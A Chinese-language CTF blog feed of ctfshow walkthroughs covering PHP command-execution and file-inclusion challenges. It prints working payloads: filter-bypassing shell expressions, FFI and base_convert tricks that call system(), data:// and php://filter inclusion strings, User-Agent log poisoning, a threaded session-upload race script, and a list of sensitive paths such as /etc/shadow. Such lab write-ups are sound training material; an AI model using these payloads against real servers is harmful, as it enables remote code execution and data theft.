└─$ <span class="hljs-built_in">echo</span> $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
36</code></pre>
<p>payload:</p>
<pre><code class="hljs html">url/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$(</code></pre>
<img src="https://img.hzy2003628.top/4d22375dd918b57496cbfbb62cb67bf5.png" alt="image-20220317211458425" style="zoom:200%;">
<h1 id="web58">web58</h1>
<img src="https://img.hzy2003628.top/3bd1f453a9d5183f4d55d8e8e3dbd3b3.png" alt="image-20220317211629048" style="zoom:200%;">
<p>这道题需要post传参，可以通过高亮显示php文件</p>
<blockquote>
<p>show_source(“flag.php”);</p>
<p>highlight_file(“flag.php”);</p>
</blockquote>
<img src="https://img.hzy2003628.top/2fc6218b093af94356ed838c3e372f56.png" alt="image-20220318195111259" style="zoom:200%;">
<h1 id="web59">web59</h1>
<img src="https://img.hzy2003628.top/c8d2a1daaed8bec50ddbd9adf5d0162f.png" alt="image-20220318195323992" style="zoom:200%;">
<p>同上</p>
<img src="https://img.hzy2003628.top/4c90c89d4f3d3079ea8bad38709d37e6.png" alt="image-20220318195407992" style="zoom:200%;">
<h1 id="web60">web60</h1>
<p>同上</p>
<h1 id="web61">web61</h1>
<p>同上</p>
<h1 id="web62">web62</h1>
<p>同上</p>
<h1 id="web63">web63</h1>
<p>同上</p>
<h1 id="web64">web64</h1>
<p>同上</p>
<h1 id="web65">web65</h1>
<p>同上</p>
<h1 id="web66">web66</h1>
<img src="https://img.hzy2003628.top/76c815f08701622f596759331e47ecd6.png" alt="image-20220318203443507" style="zoom:200%;">
<img src="https://img.hzy2003628.top/054185bcccae5f0defef01157dec1069.png" alt="image-20220318203454310" style="zoom:200%;">
<p>用show_source()，回显该函数被禁用，查看根目录下的文件</p>
<blockquote>
<p>c=print_r(scandir(“/”));</p>
</blockquote>
<img src="https://img.hzy2003628.top/5b0d5dd6dfe31edc22b64a79ef58a82c.png" alt="image-20220318203633187" style="zoom:200%;">
<p>查看根目录下的文件</p>
<blockquote>
<p>c=highlight_file(“/flag.txt”);</p>
</blockquote>
<img src="https://img.hzy2003628.top/5e94c9dfaf9a07b3191f0e4eb0e49c9c.png" alt="image-20220318203848272" style="zoom:200%;">
<h1 id="web67">web67</h1>
<img src="https://img.hzy2003628.top/e2b7f26f5921e05120d5a4197901f7c3.png" alt="image-20220318203950563" style="zoom:200%;">
<p>print_r()被禁用<br>
查看根目录下有哪些文件：<br>
用这个代替</p>
<blockquote>
<p>c=var_dump(scandir(“/”));<br>
c=highlight_file(‘/flag.txt’);</p>
</blockquote>
<img src="https://img.hzy2003628.top/be4fd951a134dc00c982738fbde2091a.png" alt="image-20220318204102115" style="zoom:200%;">
<img src="https://img.hzy2003628.top/4a4acb5886244e40474a83879c2cd8f1.png" alt="image-20220318204113038" style="zoom:200%;">
<h1 id="web68">web68</h1>
<img src="https://img.hzy2003628.top/e3f774709ae8a2243dff4c068873e64e.png" alt="image-20220318204235651" style="zoom:200%;">
<blockquote>
<p>show_source()和highlight_file()被禁用<br>
POST：c=include(‘/flag.txt’);</p>
</blockquote>
<img src="https://img.hzy2003628.top/70ef3e3fda43e91f7f2275952faf4c3d.png" alt="image-20220318204300791" style="zoom:200%;">
<h1 id="web69">web69</h1>
<img src="https://img.hzy2003628.top/6f048ca90e09254b78c34c7a7741759b.png" alt="image-20220318204417825" style="zoom:200%;">
<p>查看根目录下的文件：<br>
但是print_r()、var_dump()被禁用</p>
<p>用下面的代替</p>
<blockquote>
<p>POST：c=var_export(scandir(“/”));<br>
POST：c=include(‘/flag.txt’);</p>
</blockquote>
<img src="https://img.hzy2003628.top/e663c6b507e0a343544bcb2dd802e7e4.png" alt="image-20220318204444663" style="zoom:200%;">
<img src="https://img.hzy2003628.top/a996766710b49bfae606eb2b1ba5acbe.png" alt="image-20220318204515211" style="zoom:200%;">
<h1 id="web70">web70</h1>
<img src="https://img.hzy2003628.top/acb483b1f3f37291c965033191501557.png" alt="image-20220318204627454" style="zoom:200%;">
<blockquote>
<p>尝试使用c=include(‘index.php’);但是不行，盲猜应该还是在/flag.txt里面</p>
</blockquote>
<p>所以c=include(‘/flag.txt’);</p>
<img src="https://img.hzy2003628.top/a9dfc25fbb0a5ba364f3a67093d9df47.png" alt="image-20220318205146853" style="zoom:200%;">
<h1 id="web71">web71</h1>
<img src="https://img.hzy2003628.top/6015524a3fe88b2c954082daf3553b8c.png" alt="image-20220318205409118" style="zoom:200%;">
<p>用include函数不行了</p>
<img src="https://img.hzy2003628.top/fa2ae470957587e4a9611309e6cb7194.png" alt="image-20220318205432162" style="zoom:200%;">
<p>可以在后面加个exit函数，让匹配到缓冲区不执行就退出<img src="https://img.hzy2003628.top/20f0caf391d64ca60f4f3103c1cd1fe8.png" alt="image-20220318205601796" style="zoom:200%;"></p>
<h1 id="web72">web72</h1>
<img src="https://img.hzy2003628.top/c39ec250811ba3d866df27a24cbc1141.png" alt="image-20220318205707478" style="zoom:200%;">
<p>先看一下源码</p>
<img src="https://img.hzy2003628.top/12d227c3b092ad8f72d93c15a486fb96.png" alt="image-20220318205822789" style="zoom:200%;">
<p>这题对我来说有点难度，看了网上的wp。</p>
<p>先查询flag的位置</p>
<pre><code class="hljs plaintext">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);
foreach($a as $f)
&#123;echo($f-&gt;__toString().&#x27; &#x27;);
&#125;
exit(0);
?&gt;</code></pre>
<img src="https://img.hzy2003628.top/1c605aab28c910dc8e0799ec49c1a2fb.png" alt="image-20220318210222426" style="zoom:200%;">
<p>这题未解出。。。。。。</p>
<h1 id="web73">web73</h1>
<img src="https://img.hzy2003628.top/21e7c0597a5254179e290e8670ccab68.png" alt="image-20220318210902325" style="zoom:200%;">
<p>先读取目录</p>
<pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot; &quot;</span>);&#125;;<span class="hljs-keyword">exit</span>();</code></pre>
<img src="https://img.hzy2003628.top/3f3b157799a2116e53bff1760452f2e8.png" alt="image-20220318210924758" style="zoom:200%;">
<p>看到flag，直接include</p>
<pre><code class="hljs plaintext">c=include(&#x27;/flagc.txt&#x27;);exit();</code></pre>
<img src="https://img.hzy2003628.top/ea56db07ae06f83ea7ae49e8ed5b9ea8.png" alt="image-20220318211013551" style="zoom:200%;">
<h1 id="web74">web74</h1>
<img src="https://img.hzy2003628.top/be4a4792f1a48368bee1e0a2f2344b6a.png" alt="image-20220318211111209" style="zoom:200%;">
<p>还是先读取根目录内容</p>
<img src="https://img.hzy2003628.top/0f07e5b9ab6d8d819382ad3cd501069a.png" alt="image-20220318211136513" style="zoom:200%;">
<p>找到flag，试试直接include</p>
<img src="https://img.hzy2003628.top/f90b2f91d02e22798bfe35cf3d1fa78c.png" alt="image-20220318211304920" style="zoom:200%;">
<h1 id="web75">web75</h1>
<img src="https://img.hzy2003628.top/f2e0182aa68f82533797092c06687766.png" alt="image-20220318211339908" style="zoom:200%;">
<p>解法同上</p>
<img src="https://img.hzy2003628.top/156418e3d2b56ee39063d2d29080869f.png" alt="image-20220318211407598" style="zoom:200%;">
<p>貌似不是同上，因为include函数有不行了，可以使用一些可使用的进程去读flag，这里使用PDO(PHP Database Object)去执行sql语句进而读取flag，payload：</p>
<pre><code class="hljs plaintext">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,
&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)
&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-
&gt;getMessage();exit(0);&#125;exit(0);</code></pre>
<img src="https://img.hzy2003628.top/1791fd00da46e2c2aeb6fa8a107d6ce3.png" alt="image-20220318211722798" style="zoom:200%;">
<h1 id="web76">web76</h1>
<img src="https://img.hzy2003628.top/68d5c8bf612d1cd0f2c9044044f7e8ff.png" alt="image-20220318211840950" style="zoom:200%;">
<p>列目录</p>
<img src="https://img.hzy2003628.top/03dc546172d9bbaf705c49ff21b08546.png" alt="image-20220318211911599" style="zoom:200%;">
<img src="https://img.hzy2003628.top/e9f9c2ca536763457aa0635918841805.png" alt="image-20220318211929195" style="zoom:200%;">
<p>解法和上题一样！</p>
<h1 id="web77">web77</h1>
<img src="https://img.hzy2003628.top/edf38190e01516589ccf3a866f545041.png" alt="image-20220318212041971" style="zoom:200%;">
<p>还是先读目录</p>
<img src="https://img.hzy2003628.top/06ee2156502e80c951bfc0566c405009.png" alt="image-20220318212111711" style="zoom:200%;">
<p>还是常使用POD读取flag36x.php但是失败了，根据提示使用PHP7.4以上才有的FFI进行命令执行，所以再构造</p>
<blockquote>
<pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//创建一个system对象</span>
<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//没有回显的</span>
<span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//通过$ffi去调用system函数</span></code></pre>
</blockquote>
<pre><code class="hljs php">c=<span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);
<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;
<span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>);</code></pre>
<img src="https://img.hzy2003628.top/cbe4994ff0d2f2145df7a75689d5947a.png" alt="image-20220318212249549" style="zoom:200%;">
<p>readflag是专门用来读flag的。<br>
然后访问<code>/1.txt</code>即可。</p>
<img src="https://img.hzy2003628.top/94a2df6aca7604f681b7d2de45831f69.png" alt="image-20220318212314783" style="zoom:200%;">
<h1 id="web118">web118</h1>
<img src="https://img.hzy2003628.top/fa18aff689783dce7c5bcc30c4d18141.png" alt="image-20220318212434056" style="zoom:200%;">
<p>难得的新界面！查看一下源代码</p>
<img src="https://img.hzy2003628.top/dfcb952d92a0feff6f61ae03b125ba3d.png" alt="image-20220318212454255" style="zoom:200%;">
<blockquote>
<p>system($code);  这就是说明我们可以执行命令,但是有些指令是被ban的</p>
</blockquote>
<pre><code class="hljs plaintext">利用系统变量构造nl命令
$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre>
<img src="https://img.hzy2003628.top/202207131213810.png" alt="image-20220713121341725" style="zoom:200%;">
<h1 id="web119">web119</h1>
<p>跟上题一样的界面,又多了过滤的东西,上面的payload也被ban了</p>
<pre><code class="hljs plaintext">$&#123;SHLVL&#125;       //一般是一个个位数
$&#123;#SHLVL&#125;     //1，表示结果的字符长度
$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       //表示/
$&#123;USER&#125;        //www-data
$&#123;PHP_VERSION:~A&#125;       //2
$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         //at</code></pre>
<p>payload如下</p>
<pre><code class="hljs plaintext">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</code></pre>
<pre><code class="hljs plaintext">/???/?at ????.???</code></pre>
<img src="https://img.hzy2003628.top/202207131224890.png" alt="image-20220713122441821" style="zoom:200%;">
<h1 id="web120">web120</h1>
<p>题目如下</p>
<pre><code class="hljs plaintext">
&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#x27;code&#x27;]))&#123;
    $code=$_POST[&#x27;code&#x27;];
    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;   //  限制长度
            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;
        &#125;
        else&#123;
        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;
        &#125;
    &#125;
    else&#123;
     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;
    &#125;
&#125;

?&gt;</code></pre>
<p>测试发现过滤了PATH,采用shell的base64加密</p>
<blockquote>
<p>base64路径在/bin/base64,用?匹配的时候需要匹配全路径,不能只匹配base64</p>
</blockquote>
<p>payload(由于用了随机函数，可能要多试几次)</p>
<pre><code class="hljs plaintext">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre>
<img src="https://img.hzy2003628.top/202207131231077.png" alt="image-20220713123133000" style="zoom:200%;">
<h1 id="web121">web121</h1>
<p>题目如下</p>
<pre><code class="hljs plaintext">
&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#x27;code&#x27;]))&#123;
    $code=$_POST[&#x27;code&#x27;];
    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;
        &#125;
        else&#123;
        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;
        &#125;
    &#125;
    else&#123;
     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;
    &#125;
&#125;

?&gt;</code></pre>
<p>又过滤了SHLVL,可以用#?来代替,payload如下</p>
<pre><code class="hljs plaintext">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???  // /bin/base64 flag.php</code></pre>
<img src="https://img.hzy2003628.top/202207131237551.png" alt="image-20220713123721471" style="zoom:200%;">
<h1 id="web122">web122</h1>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#x27;code&#x27;]))&#123;
    $code=$_POST[&#x27;code&#x27;];
    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;
        &#125;
        else&#123;
        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;
        &#125;
    &#125;
    else&#123;
     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;
    &#125;
&#125;

?&gt;
</code></pre>
<blockquote>
<p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
</blockquote>
<p>官方wp给的payload</p>
<pre><code class="hljs plaintext">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</code></pre>
<p>反复刷新就出来了</p>
<img src="https://img.hzy2003628.top/202207131239105.png" alt="image-20220713123941038" style="zoom:200%;">
<h1 id="web124">web124</h1>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#x27;c&#x27;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    //例子 c=20-1
    $content = $_GET[&#x27;c&#x27;];
    if (strlen($content) &gt;= 80) &#123;
        die(&quot;太长了不会算&quot;);
    &#125;
    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        &#125;
    &#125;
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];
    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) &#123;
        if (!in_array($func, $whitelist)) &#123;
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        &#125;
    &#125;
    //帮你算出答案
    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);
&#125;</code></pre>
<pre><code class="hljs plaintext">?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 
添加头部信息：1=tac flag.php</code></pre>
<pre><code class="hljs plaintext">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs=system&amp;acos=tac flag.php</code></pre>
<p>这俩都行</p>
<img src="https://img.hzy2003628.top/202207131242827.png" alt="image-20220713124248743" style="zoom:200%;">
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW文件包含78-117</title>
    <url>/2022/02/26/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-117/</url>
    <content><![CDATA[<p><strong>ctfshow文件包含刷题记录</strong></p>
<p><img src="http://img.hzy2003628.top/202207131200686.png" alt="image-20220713120008631"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<h2 id="php包含函数">PHP包含函数</h2>
<ul>
<li>include()：如果包含文件未找到会显示警告，脚本继续执行；</li>
<li>include_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行；</li>
<li>require()：包含文件未找到会产生致命错误，脚本终止；</li>
<li>require_once()：包含过的文件不再包含，包含文件未找到会产生致命错误，脚本终止。</li>
</ul>
<h2 id="敏感文件">敏感文件</h2>
<pre><code class="hljs plaintext">Linux/Unix系统
/etc/passwd                                                              //  账户信息
/etc/shadow                                                             //  账户密码文件
/usr/local/app/apache2/conf/httpd.conf                                 //   Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf                    //   虚拟网站配置
/usr/local/app/php5/lib/php.ini                                      //   PHP相关配置
/etc/httpd/conf/httpd.conf                                          //   Apache配置文件
/etc/my.conf                                                       //   mysql 配置文件</code></pre>
<h2 id="php伪协议">php伪协议</h2>
<ul>
<li>条件：
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>
</ul>
</li>
</ul>
<p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>read</td>
<td>读取</td>
</tr>
<tr>
<td>write</td>
<td>写入</td>
</tr>
<tr>
<td>resource</td>
<td>数据来源</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">读取文件源码可以直接用resource读取(常用)
php://filter/convert.base64-encode/resource=flag.php          base64编码
php://filter/convert.quoted-printable-encode/resource=flag.php quoted-printable编码
php://filter/string.rot13/resource=flag.php                     rot13变换`</code></pre>
<h2 id="data-协议">data:// 协议</h2>
<ul>
<li>条件
<ul>
<li>
<p><code>allow_url_fopen</code>:on</p>
</li>
<li>
<p><code>allow_url_include</code> :on</p>
</li>
</ul>
</li>
</ul>
 <pre><code class="hljs plaintext">data://text/plain,&lt;?php phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></pre>
<h2 id="日志文件include">日志文件include</h2>
<ul>
<li>原理:对网站进行访问时,日志文件会记录相关信息(请求头中的信息)</li>
<li>前提:知道日志文件所在,并能进行包含</li>
<li>步骤:
<ul>
<li>先访问网站在请求头中写入一句话(一般写在UA中)</li>
<li>然后通过post去尝试执行</li>
<li>执行成功后通过蚁剑连接得到shell</li>
</ul>
</li>
</ul>
<p>内容参考博客:</p>
<p><a href="https://blog.csdn.net/weixin_45794666/article/details/111713495">https://blog.csdn.net/weixin_45794666/article/details/111713495</a></p>
<h1 id="web77">web77</h1>
<p><img src="https://z4a.net/images/2022/06/14/image-20220226143629846.png" alt="image-20220226143629846.png"></p>
<p>考察php伪协议，直接<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>，然后得到base64加密内容<img src="https://z4a.net/images/2022/06/14/image-20220226143837369.png" alt="image-20220226143837369.png"></p>
<p>然后base64解密得到flag<img src="https://z4a.net/images/2022/06/14/image-20220226143858354.png" alt="image-20220226143858354.png"></p>
<h1 id="web79">web79</h1>
<p><img src="https://z4a.net/images/2022/06/14/image-20220226144104774.png" alt="image-20220226144104774.png"></p>
<p>审计一下发现还是考察php伪协议，所以直接data协议加正则匹配替换，因为在这个题中对小写php进行了过滤，所以我们可以用p?p.</p>
<blockquote>
<p>?file=data://text/plain,<?=system("tac%20flag.p?p");?></p>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/14/image-20220226145551517.png" alt="image-20220226145551517.png"></p>
<h1 id="web80">web80</h1>
<img src="https://img.hzy2003628.top/664efd6d6fd8fae96f759eeea0e6ce74.png" alt="image-20220323192713160" style="zoom:200%;">
<p>过滤了php协议，过滤了data协议，查看一个这个路径</p>
<p><code>?file=/var/log/nginx/access.log</code>，发现存在日志包含，bp抓包<img src="https://img.hzy2003628.top/b90593cc59089a5950034e9ccdabc47f.png" alt="image-20220323192839133" style="zoom:200%;"></p>
<p>直接在ua里面下马放包<img src="https://img.hzy2003628.top/ef09fc67f19ef5c6776fa8cf028eb2eb.png" alt="image-20220323192954808" style="zoom:200%;"></p>
<img src="https://img.hzy2003628.top/24e67f9b55fdfe1bf8e72111e5ca7f67.png" style="zoom:200%;">
<img src="https://img.hzy2003628.top/ad60a3d1dc711a98475cf9f3261dc960.png" alt="image-20220323193022938" style="zoom:200%;">
<h1 id="web81">web81</h1>
<img src="https://img.hzy2003628.top/071d5ae214061afff4044e78df2cac21.png" alt="image-20220323193119066" style="zoom:200%;">
<p>这道题同上，存在日志包含漏洞</p>
<img src="https://img.hzy2003628.top/739d447ce88f1d661bec11607989e3d4.png" alt="image-20220323193326689" style="zoom:200%;">
<h1 id="web82">web82</h1>
<img src="https://img.hzy2003628.top/03f0210290e709bd3f65bb8490db287b.png" alt="image-20220323195224767" style="zoom:200%;">
<h1 id="web83">web83</h1>
<img src="https://img.hzy2003628.top/cf2c677e2736235f977f6f0343be80f1.png" alt="image-20220323195307713" style="zoom:200%;">
<p>这道题过滤了php，data，分号还有<code>.</code></p>
<p>显然这样不行了<img src="https://img.hzy2003628.top/83424b79755d4c16e70834050e20eaee.png" alt="image-20220323195759318" style="zoom:200%;"></p>
<p>这道题是利用PHP_SESSION_UPLOAD_PROGRESS进行session文件包含和条件竞争</p>
<blockquote>
<p><strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong></p>
</blockquote>
<p>不是夜猫子,等不到这个时候,83-86先暂时放着吧,放个通杀脚本</p>
<pre><code class="hljs plaintext"># -*- coding: utf-8 -*-
# @author:lonmar
import io
import requests
import threading

sessID = &#x27;flag&#x27;
url = &#x27;http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/&#x27;


def write(session):
    while event.isSet():
        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)
        response = session.post(
            url,
            cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;,
            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;&#125;,
            files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125;
        )


def read(session):
    while event.isSet():
        response = session.get(url + &#x27;?file=/tmp/sess_&#123;&#125;&#x27;.format(sessID))
        if &#x27;test&#x27; in response.text:
            print(response.text)
            event.clear()
        else:
            print(&#x27;[*]retrying...&#x27;)


if __name__ == &#x27;__main__&#x27;:
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()</code></pre>
<h1 id="web87">web87</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET[&#x27;file&#x27;]))&#123;
    $file = $_GET[&#x27;file&#x27;];
    $content = $_POST[&#x27;content&#x27;];
    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);  //  php伪协议被ban
    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);  // data协议被ban
    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);
    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);
    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);

    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
